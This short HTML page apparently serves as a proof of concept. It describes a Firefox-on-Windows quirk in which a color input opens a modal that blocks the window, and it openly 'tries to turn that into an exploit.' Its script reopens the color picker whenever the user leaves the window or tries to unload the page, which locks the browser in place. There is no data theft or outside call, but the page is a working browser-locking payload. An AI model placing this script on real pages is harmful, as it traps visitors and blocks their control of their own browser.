        <title>Color locker</title>
    </head>
    <body>
        <div>
            In Firefox on Windows, <code>input</code> elements which have <code>type="color"</code> open a weird model which blocks interaction with the current window.
            This page tries to turn that into an exploit.
            <label>Evil picker: <input type="color" id="evil"></label>
        </div>
        <script>
            var evilstuff = function(){
                document.getElementById("evil").click();
            };
            window.onbeforeunload = evilstuff;
            window.onblur = evilstuff;
        </script>
    </body>
